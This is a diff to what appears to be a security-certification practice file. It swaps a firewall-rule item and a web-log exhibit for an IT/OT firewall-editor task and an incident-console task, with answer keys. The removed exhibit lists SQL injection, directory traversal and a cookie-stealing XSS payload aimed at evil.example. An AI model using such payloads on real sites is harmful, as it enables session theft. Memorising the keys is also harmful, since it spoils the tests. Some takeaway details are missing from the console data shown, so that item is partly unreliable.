@@ -59,51 +59,58 @@ CONTROLS ('*' = scored; 'crit' = changing it breaks the business function, −1;
     ! Host firewall: start=On  [crit: keep]   // It enforces the RDP source restriction; nothing asked you to turn it off.
 TAKEAWAY: OT hardening: no dual-homing, no radios, no removable media, least privilege, remote access from one VLAN, patches in the outage window. Availability of the production link is non-negotiable.
 
-[pb3] sim=fwrule domain=4 obj=4.5 (Given a scenario, modify enterprise capabilities to enhance security)
-TITLE: Firewall rule evaluation
-PROMPT: Walk the rule table top-down for the packet shown.
-TASK:
-    1. Compare the packet's source, destination and port against each rule from the top.
-    2. Stop at the first rule where all three match; that rule's action applies.
-    3. If nothing matches, the implicit deny at the bottom applies.
-(generated: a fresh problem every attempt; grader in core/sims/generators.js)
+[pb3] sim=fweditor domain=4 obj=4.5 (Given a scenario, modify enterprise capabilities to enhance security)
+TITLE: Plant OT: rebuild the IT/OT boundary firewall
+PROMPT: The firewall between the plant's office network, OT DMZ and control network was edited during an outage and is now wrong. Edit, add, delete and reorder rules until it enforces the policy. Rules are evaluated top-down.
+TASKS:
+    - The office LAN (10.0.10.0/24) may reach only the historian replica in the OT DMZ (10.0.150.10), on TCP 443. It must never reach the control network (10.0.200.0/24) directly.
+    - Office PC 10.0.10.66 is quarantined after a malware alert: deny it everything.
+    - The plant historian (10.0.200.20) pushes data to the replica on TCP 1433. Nothing in the OT DMZ may initiate connections into the control network.
+    - The engineering VLAN (10.0.5.0/24) may reach the control network on TCP 502 (Modbus) and TCP 44818 (EtherNet/IP) only.
+    - Everything not listed is denied.
+NETWORKS: any=Any, 10.0.10.0/24=Office LAN, 10.0.10.66=Quarantined office PC, 10.0.5.0/24=Engineering VLAN, 10.0.150.0/24=OT DMZ, 10.0.150.10=Historian replica, 10.0.200.0/24=Control network, 10.0.200.20=Plant historian
+STARTING RULES (top-down, first match):
+    1. allow 10.0.10.0/24 → 10.0.150.0/24 any/any
+    2. deny 10.0.10.66 → any any/any
+    3. allow 10.0.150.0/24 → 10.0.200.0/24 any/any
+    4. allow 10.0.5.0/24 → 10.0.200.0/24 tcp/502
+HIDDEN TEST PACKETS (KEY):
+    ALLOW  10.0.10.40 → 10.0.150.10 tcp/443   // office users read production data from the replica
+    DENY   10.0.10.40 → 10.0.150.10 tcp/3389   // the office gets HTTPS to the replica, not remote desktop
+    DENY   10.0.10.66 → 10.0.150.10 tcp/443   // the quarantine deny must sit ABOVE the office allow it carves out of
+    DENY   10.0.10.40 → 10.0.200.20 tcp/1433   // no direct path from IT into the control network
+    ALLOW  10.0.200.20 → 10.0.150.10 tcp/1433   // the historian pushes outward to the replica
+    DENY   10.0.150.10 → 10.0.200.20 tcp/1433   // data flows out of OT; the DMZ never initiates inward
+    DENY   10.0.150.10 → 10.0.200.50 tcp/502   // a compromised replica must not be able to speak Modbus to a PLC
+    ALLOW  10.0.5.33 → 10.0.200.50 tcp/502   // engineering workstation programs a PLC over Modbus
+    ALLOW  10.0.5.33 → 10.0.200.50 tcp/44818   // EtherNet/IP was granted as well
+    DENY   10.0.5.33 → 10.0.200.50 tcp/80   // only the two industrial protocols, not the PLC's web page
+    DENY   10.0.10.40 → 10.0.200.50 tcp/502   // office hosts never speak Modbus
+TAKEAWAY: Purdue-style IT/OT separation: office users touch a replica in the OT DMZ, never the PLCs; data flows outward from the historian to the replica, not inward; only the engineering VLAN speaks the industrial protocols to the control network. A single-host quarantine is a deny that must precede the subnet allow it overrides.
 
-[pb4] sim=exhibit domain=2 obj=2.4 (Given a scenario, analyze indicators of malicious activity)
-TITLE: Exhibit: web server log
-SETUP: A cloud startup's web application firewall is in monitor-only mode. The access log shows these requests from one client in under a minute.
-EXHIBIT:
-    203.0.113.77 GET /login?user=admin'--&pass=x                       200
-    203.0.113.77 GET /login?user=admin' OR '1'='1&pass=x               200
-    203.0.113.77 GET /search?q=<script>document.location='http://evil.example/c?'+document.cookie</script> 200
-    203.0.113.77 GET /files?name=../../../../etc/passwd                 403
-    203.0.113.77 GET /api/orders?id=1000                                200
-    203.0.113.77 GET /api/orders?id=1001                                200
-    203.0.113.77 GET /api/orders?id=1002                                200
-  1. What are the first two requests attempting?
-     * A. SQL injection to bypass authentication
-       B. Cross-site scripting
-       C. Directory traversal
-       D. Credential stuffing with a leaked password list
-     why: Quote-and-comment (admin'--) and the always-true OR '1'='1 are authentication-bypass SQL injection payloads. XSS uses script tags; traversal uses ../; stuffing uses many real credential pairs.
-  2. What is the third request attempting, and who is the victim?
-     * A. Reflected cross-site scripting that steals another user's session cookie
-       B. A denial of service against the search index
-       C. SQL injection against the search table
-       D. A brute-force attack on the search function
-     why: The script tag sends document.cookie to an attacker host; if the search page echoes input, any user tricked into that URL leaks their session. The server is the carrier, the user is the victim.
-  3. The 403 on the fourth request shows which control worked?
-     * A. Input validation or path restriction blocked directory traversal
-       B. The WAF blocked the request
-       C. Rate limiting blocked the client
-       D. TLS prevented the download
-     why: ../ sequences reaching for /etc/passwd is directory traversal; a 403 means the app or web server refused the path. The WAF is in monitor-only mode, so it did not block.
-  4. What do the last three requests suggest, and what is the BEST fix?
-     * A. Sequential IDs are being enumerated (insecure direct object reference); enforce authorization on every object and use non-guessable IDs
-       B. Normal browsing; no action
-       C. A buffer overflow; patch the API
-       D. A DDoS; add more capacity
-     why: Walking id=1000, 1001, 1002 with 200 responses means the API returns other customers' orders without checking ownership. Server-side authorization per object is the fix.
-TAKEAWAY: Read payloads: quotes and OR 1=1 are SQLi, script tags are XSS, ../ is traversal, sequential IDs are IDOR. Input validation and server-side authorization are the fixes; move the WAF to blocking.
+[pb4] sim=console domain=2 obj=2.4 (Given a scenario, analyze indicators of malicious activity)
+TITLE: Incident console: cloud startup container host turned proxy node
+PROMPT: The startup's cloud bill spiked on outbound traffic and threat intel flagged two addresses its hosts talk to. You have a shell on the container host and on the Windows jump box. Stop the malicious activity without taking the product API down.
+TASKS:
+    - Compare each host's listening ports and established connections with the IoC list to find the malicious service.
+    - Stop the malicious service on each host.
+    - Block each IoC address on EVERY host that has a connection to it. Check netstat on both hosts.
+    - The API gateway, the container runtime, SSH and Remote Desktop must keep running, and so must the startup's own metrics and secrets agents (they talk to internal 172.16.9.x collectors).
+IOCs given: ports=1080, 6667 · procs= · ips=192.0.2.150, 203.0.113.200
+HOST ctr-node2 (linux, 172.16.8.21)
+    ! KEEP  containerd "containerd container runtime" proc=containerd pid=705
+    ! KEEP  api-gateway "Product API gateway" proc=gateway pid=1460 listen=tcp/8443
+    ! KEEP  ssh "OpenBSD Secure Shell server" proc=sshd pid=812 listen=tcp/22
+    ! KEEP  metrics-agent "Metrics shipper" proc=metricsd pid=1588 remote=172.16.9.10:4317
+      leave  unattended-upgrades "Unattended Upgrades Shutdown" proc=unattended-upgr pid=744
+    * STOP  netsvc-proxy "Network service proxy" proc=nsproxy pid=5021 listen=tcp/1080 remote=192.0.2.150:443
+HOST JUMP01 (windows, 172.16.8.5)
+    ! KEEP  TermService "Remote Desktop Services" proc=svchost.exe pid=1096 listen=tcp/3389
+    ! KEEP  SecretsBroker "Secrets broker agent" proc=secrets-agent.exe pid=2410 remote=172.16.9.30:8200
+      leave  Spooler "Print Spooler" proc=spoolsv.exe pid=1792
+    * STOP  WinNetMon "Windows Network Monitor Helper" proc=netmonhlp.exe pid=6188 remote=203.0.113.200:6667
+KEY: block 192.0.2.150, 203.0.113.200 on every host that talks to it; stop every '* STOP' service; '! KEEP' stopped = −1, other legit services stopped = −½
+TAKEAWAY: The indicators are behavioral: an unexpected SOCKS listener on 1080 open to everyone, a binary running from /var/tmp, an IRC-port (6667) connection from a service in C:\Windows\Temp, and a PowerShell download from the same address the proxy registers with. The metrics and secrets agents hold constant outbound sessions too, but to internal 172.16.9.x collectors. Because the jump box also touched 192.0.2.150, that address has to be blocked on both hosts.
 
 [pb5] sim=risk domain=5 obj=5.2 (Explain elements of the risk management process)
 TITLE: Risk math: SLE, ALE, cost-benefit
